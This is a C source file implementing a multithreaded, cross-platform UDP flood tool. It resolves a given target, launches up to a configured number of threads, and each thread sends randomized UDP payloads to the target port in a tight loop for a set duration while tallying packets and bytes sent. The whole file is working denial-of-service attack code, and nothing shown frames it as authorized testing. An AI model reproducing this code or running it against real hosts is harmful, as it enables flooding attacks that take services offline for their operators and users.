#include "udp_flood.h"
#include "../config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
  #define WIN32_LEAN_AND_MEAN
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #include <windows.h>
  #pragma comment(lib, "ws2_32.lib")
  typedef SOCKET sock_t;
  typedef HANDLE thread_t;
  typedef CRITICAL_SECTION mutex_t;
  #define SOCK_INVALID INVALID_SOCKET
  #define CLOSESOCK closesocket
  #define MUTEX_INIT(m)   InitializeCriticalSection(&(m))
  #define MUTEX_LOCK(m)   EnterCriticalSection(&(m))
  #define MUTEX_UNLOCK(m) LeaveCriticalSection(&(m))
  #define MUTEX_DESTROY(m) DeleteCriticalSection(&(m))
#else
  #include <unistd.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #include <pthread.h>
  #include <errno.h>
  typedef int sock_t;
  typedef pthread_t thread_t;
  typedef pthread_mutex_t mutex_t;
  #define SOCK_INVALID (-1)
  #define CLOSESOCK close
  #define MUTEX_INIT(m)   pthread_mutex_init(&(m), NULL)
  #define MUTEX_LOCK(m)   pthread_mutex_lock(&(m))
  #define MUTEX_UNLOCK(m) pthread_mutex_unlock(&(m))
  #define MUTEX_DESTROY(m) pthread_mutex_destroy(&(m))
#endif

struct udp_flood_ctx {
    char            target[256];
    int             port;
    int             duration;
    int             num_threads;
    int             payload_size;
    volatile int    stop_flag;
    int64_t         packets_sent;
    int64_t         bytes_sent;
    mutex_t         stats_mutex;
    udp_flood_log_fn log_cb;
    thread_t       *threads;
    double          start_time;
    double          end_time;
};

static double udp_get_time_sec(void) {
#ifdef _WIN32
    LARGE_INTEGER freq, cnt;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&cnt);
    return (double)cnt.QuadPart / (double)freq.QuadPart;
#else
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
#endif
}

static void udp_log_msg(udp_flood_t *ctx, const char *msg) {
    if (ctx->log_cb) ctx->log_cb(msg);
}

static void udp_fill_random(unsigned char *buf, int len, unsigned int *seed) {
    for (int i = 0; i < len; i++) {
        *seed = (*seed) * 1103515245 + 12345;
        buf[i] = (unsigned char)((*seed >> 16) & 0xFF);
    }
}

typedef struct {
    udp_flood_t *ctx;
    int          thread_id;
} udp_worker_arg_t;

static
#ifdef _WIN32
DWORD WINAPI
#else
void *
#endif
udp_flood_worker(void *arg) {
    udp_worker_arg_t *wa = (udp_worker_arg_t *)arg;
    udp_flood_t *ctx = wa->ctx;
    int tid = wa->thread_id;
    free(wa);

    unsigned int seed = (unsigned int)(time(NULL) ^ (tid * 6547));

    /* Resolve target */
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)ctx->port);

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;

    if (getaddrinfo(ctx->target, NULL, &hints, &res) == 0 && res) {
        struct sockaddr_in *r = (struct sockaddr_in *)res->ai_addr;
        addr.sin_addr = r->sin_addr;
        freeaddrinfo(res);
    } else {
#ifdef _WIN32
        return 0;
#else
        return NULL;
#endif
    }

    /* Create UDP socket */
    sock_t s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == SOCK_INVALID) {
#ifdef _WIN32
        return 0;
#else
        return NULL;
#endif
    }

    /* Allocate payload buffer */
    int psize = ctx->payload_size;
    unsigned char *payload = (unsigned char *)malloc((size_t)psize);
    if (!payload) {
        CLOSESOCK(s);
#ifdef _WIN32
        return 0;
#else
        return NULL;
#endif
    }

    double deadline = ctx->start_time + ctx->duration;

    while (!ctx->stop_flag && udp_get_time_sec() < deadline) {
        /* Randomize payload */
        udp_fill_random(payload, psize, &seed);

        int sent = sendto(s, (const char *)payload, psize, 0,
                          (struct sockaddr *)&addr, sizeof(addr));

        if (sent > 0) {
            MUTEX_LOCK(ctx->stats_mutex);
            ctx->packets_sent++;
            ctx->bytes_sent += sent;
            MUTEX_UNLOCK(ctx->stats_mutex);
        }
    }

    free(payload);
    CLOSESOCK(s);

#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

int udp_flood_init(udp_flood_t **out, const char *target, int duration,
                   int threads, int port, int payload_size,
                   udp_flood_log_fn log_cb) {
    if (!out || !target) return -1;

#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

    udp_flood_t *ctx = (udp_flood_t *)calloc(1, sizeof(udp_flood_t));
    if (!ctx) return -1;

    strncpy(ctx->target, target, sizeof(ctx->target) - 1);
    ctx->port         = port > 0 ? port : DEFAULT_PORT;
    ctx->duration     = duration > 0 ? (duration > MAX_DURATION_SECONDS ? MAX_DURATION_SECONDS : duration) : DEFAULT_DURATION;
    ctx->num_threads  = threads > 0 ? (threads > MAX_THREADS ? MAX_THREADS : threads) : DEFAULT_THREADS;
    ctx->payload_size = payload_size > 0 ? (payload_size > MAX_UDP_PAYLOAD ? MAX_UDP_PAYLOAD : payload_size) : DEFAULT_UDP_PAYLOAD;
    ctx->stop_flag    = 0;
    ctx->packets_sent = 0;
    ctx->bytes_sent   = 0;
    ctx->log_cb       = log_cb;
    ctx->threads      = (thread_t *)calloc((size_t)ctx->num_threads, sizeof(thread_t));

    MUTEX_INIT(ctx->stats_mutex);

    *out = ctx;
    return 0;
}

udp_flood_stats_t udp_flood_run(udp_flood_t *ctx) {
    udp_flood_stats_t stats;
    memset(&stats, 0, sizeof(stats));
    if (!ctx) return stats;

    char msg[256];
    snprintf(msg, sizeof(msg), "[UDP Flood] Starting %d threads for %ds against %s:%d (payload %d bytes)",
             ctx->num_threads, ctx->duration, ctx->target, ctx->port, ctx->payload_size);
    udp_log_msg(ctx, msg);

    ctx->start_time = udp_get_time_sec();

    /* Launch workers */
    for (int i = 0; i < ctx->num_threads; i++) {
        udp_worker_arg_t *wa = (udp_worker_arg_t *)malloc(sizeof(udp_worker_arg_t));
        wa->ctx = ctx;
        wa->thread_id = i;

#ifdef _WIN32
        ctx->threads[i] = CreateThread(NULL, 0, udp_flood_worker, wa, 0, NULL);
#else
        pthread_create(&ctx->threads[i], NULL, udp_flood_worker, wa);
#endif
    }

    /* Wait for all threads */
    for (int i = 0; i < ctx->num_threads; i++) {
#ifdef _WIN32
        WaitForSingleObject(ctx->threads[i], INFINITE);
        CloseHandle(ctx->threads[i]);
#else
        pthread_join(ctx->threads[i], NULL);
#endif
    }

    ctx->end_time = udp_get_time_sec();

    stats.packets_sent = ctx->packets_sent;
    stats.bytes_sent   = ctx->bytes_sent;
    stats.start_time   = ctx->start_time;
    stats.end_time     = ctx->end_time;

    snprintf(msg, sizeof(msg), "[UDP Flood] Finished: %lld packets, %lld bytes",
             (long long)stats.packets_sent, (long long)stats.bytes_sent);
    udp_log_msg(ctx, msg);

    return stats;
}

void udp_flood_stop(udp_flood_t *ctx) {
    if (ctx) ctx->stop_flag = 1;
}

void udp_flood_destroy(udp_flood_t *ctx) {
    if (!ctx) return;
    MUTEX_DESTROY(ctx->stats_mutex);
    free(ctx->threads);
    free(ctx);

#ifdef _WIN32
    WSACleanup();
#endif
}
